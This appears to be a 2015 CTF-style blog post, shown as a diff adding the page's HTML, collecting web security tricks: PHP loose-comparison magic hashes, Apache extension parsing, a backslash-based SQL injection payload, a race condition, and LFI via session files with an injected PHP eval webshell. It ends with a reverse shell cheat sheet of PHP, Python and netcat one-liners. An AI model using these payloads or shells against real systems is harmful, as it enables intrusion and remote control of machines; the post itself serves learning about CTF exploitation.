@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <title>Web Security Tricks (1)</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+
+        <!--[if IE]>
+            <script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">lili_blog </a></h1>
+                <nav><ul>
+                    <li><a href="/category/category.html">Category</a></li>
+                    <li><a href="/category/ctf-web.html">CTF web</a></li>
+                    <li><a href="/category/injection.html">InJection</a></li>
+                    <li class="active"><a href="/category/web.html">web</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/Web Tricks.html" rel="bookmark"
+           title="Permalink to Web Security Tricks (1)">Web Security Tricks (1)</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2015-10-23T10:58:00+02:00">
+                Published: 五 23 十月 2015
+        </abbr>
+
+        <address class="vcard author">
+                By                         <a class="url fn" href="/author/md4.html">MD4</a>
+        </address>
+<p>In <a href="/category/web.html">web</a>.</p>
+<p>tags: <a href="/tag/web-tricks.html">Web Tricks</a> </p>
+</footer><!-- /.post-info -->      <h2>Web Security Tricks (1)</h2>
+<p><strong><em>Recently Collect From ISG &amp;&amp; AIS3-CTF</em></strong></p>
+<h4>ISG</h4>
+<ul>
+<li>
+<h3>PHP Obfuscation</h3>
+<p>There are serveral confusion in PHP (the Best Language in the world), the <strong><em>First ONE</em></strong> is <code>==</code>:</p>
+<div class="highlight"><pre><span></span>var_dump(&quot;0e123432123&quot; == &quot;0e9234531231&quot;);
+
+bool(true)
+</pre></div>
+
+
+<p>PHP will try to turn the string "0e123432123" to int, which will result in turn to as 0e123432123, as <code>zero</code>. So the above order will be BOOL(True).
+As such PHP working ways, if some frameworks or register-login systems use "==" to check md5 result between passwords from Database and Post Data, then problems come. WTF!!</p>
+<div class="highlight"><pre><span></span>php &gt; var_dump(md5(&quot;400035577431&quot;) == md5(&quot;QNKCDZO&quot;));
+
+bool(true)
+</pre></div>
+
+
+<p>When I try to compare with two strings whose md5 starts with 1e, which I think will equal too. However, the result is upset:</p>
+<div class="highlight"><pre><span></span>php &gt; var_dump(&quot;1e4235242413&quot; == &quot;1e12312312313&quot;);
+
+bool(false)
+</pre></div>
+
+
+<p>I wanna find out why, and It came the reason:</p>
+<div class="highlight"><pre><span></span>php &gt; var_dump(1e12312312313);
+
+float(INF)
+</pre></div>
+
+
+<p>When PHP try to turn 1e12312312313 to number, but it failed because such number is a <code>float(INF)</code> type, which result the == compare as original <code>Sting</code> type, not the <code>float(INF)</code> type.</p>
+<p>Another Obfuscation is the Array:</p>
+<div class="highlight"><pre><span></span><span class="x">php &gt; </span><span class="p">$</span><span class="nv">a</span><span class="x">[0x10000000000000000] = &#39;admin&#39;;</span>
+
+<span class="x">php &gt; var_dump(</span><span class="p">$</span><span class="nv">a</span><span class="x">);</span>
+<span class="x">array(1) </span><span class="err">{</span><span class="x"></span>
+<span class="x">  [0]=&gt;</span>
+<span class="x">  string(5) &quot;admin&quot;</span>
+<span class="x">}</span>
+</pre></div>
+
+
+<p>In one word it like some int overflow~</p>
+<p>The Last Obfuscation is that Bool type and String:</p>
+<div class="highlight"><pre><span></span>php &gt; var_dump(&quot;asdas&quot; == true);
+
+bool(true)
+</pre></div>
+
+
+<p>Because it need to compare between different types, so when <code>unserailize</code> used, It may come such peoblems </p>
+</li>
+<li>
+<h3>Apache File Analyze Problem</h3>
+<p>When apache meet filename like "aaa.php.asdasd", the file type "asdasd" is unknown to apache, the apache will try to prase this file by "php" type.</p>
+</li>
+<li>
+<h3>SQLi bypass escape (new) ways</h3>
+<p>When encounter sql like </p>
+<div class="highlight"><pre><span></span><span class="x">Select * from users where first_name = &#39;f(</span><span class="p">$</span><span class="nv">_GET</span><span class="x">[user])&#39; or last_name = &#39;f(</span><span class="p">$</span><span class="nv">_GET</span><span class="x">[user])&#39;</span>
+</pre></div>
+
+
+<p>and The function f is not filter the <code>\</code>, then hahaha</p>
+<div class="highlight"><pre><span></span><span class="p">$</span><span class="nv">_GET</span><span class="x">[user] = or -1 order by 1</span><span class="err">#</span><span class="x">\</span>
+</pre></div>
+
+
+<p>Then the sql will be broken like this:</p>
+<p>Select * from users where first_name = '<strong><em>or -1 order by 1#\' or last_name = </em></strong>'or -1 order by 1#\'</p>
+<p>Then DONE.</p>
+</li>
+</ul>
+<hr />
+<h4>AIS3-CTF</h4>
+<p>Orange.tw write a sqlpwn.php as a source code audit. There two problems in this code: Race Condition and SQL byte substr.</p>
+<ul>
+<li>
+<h3>Race Condition</h3>
+<p>Actually, this is an apparent race condition. Two mysql-query order in the register mode, and if the second one is not executed and login mode came then I can login with 'OK'.</p>
+<p>There is a trick in such payload, my payload is try to repeatedly login and then register one and then judge the return content. However I try mannly serval times but failed.
+While orange's paylaod like just login once and register once but repeatedly try 0xffff times and then <code>PHPSESSID</code> come.</p>
+<p>PS: The python function he use is the threading.</p>
+</li>
+<li>
+<h3>LFI with SESS files</h3>
+<p>There is a LFI in the code however I can jues control the middle part of the include one:</p>
+<div class="highlight"><pre><span></span><span class="x">include getcwd() . &#39;/&#39; . </span><span class="p">$</span><span class="nv">_GET</span><span class="x">[&#39;boom&#39;] . &quot;php&quot;;</span>
+</pre></div>
+
+
+<p>Then came the most beautiful part, I can create a <strong>/var/lib/php5/sessions/sess_aaaphp</strong> part by login with the <code>PHPSESSID = aaaphp</code>, and username with <code>&lt;?php eval($_POST[ccc])?&gt;</code>.
+AND </p>
+<div class="highlight"><pre><span></span><span class="p">$</span><span class="nv">_GET</span><span class="x">[&#39;boom&#39;] = ../../../../../../../var/lib/php5/sessions/sess_aaa</span>
+</pre></div>
+
+
+<p>Then a php one line eval was injected!</p>
+</li>
+<li>
+<h3>REVERSE SHELL CHEAT SHEET</h3>
+</li>
+<li>
+<p>PHP:</p>
+<div class="highlight"><pre><span></span><span class="x">php -r &#39;</span><span class="p">$</span><span class="nv">sock</span><span class="x">=fsockopen(&quot;192.168.0.100&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
+</pre></div>
+
+
+</li>
+<li>
+<p>PYTHON:</p>
+<div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.100&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
+</pre></div>
+
+
+</li>
+<li>
+<p>NC without -e:</p>
+<div class="highlight"><pre><span></span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+</pre></div>
+
+
+<hr />
+<div class="highlight"><pre><span></span>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p
+</pre></div>
+
+
+</li>
+</ul>
+<hr />
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="blogroll">
+                        <h2>blogroll</h2>
+                        <ul>
+                            <li><a href="http://getpelican.com/">Pelican</a></li>
+                            <li><a href="http://python.org/">Python.org</a></li>
+                            <li><a href="http://jinja.pocoo.org/">Jinja2</a></li>
+                            <li><a href="#">You can modify those links in your config file</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+
+                            <li><a href="#">You can add links in your config file</a></li>
+                            <li><a href="#">Another social link</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
+                </address><!-- /#about -->
+
+                <p>The theme is by <a href="http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
+        </footer><!-- /#contentinfo -->
+
+</body>
+</html>
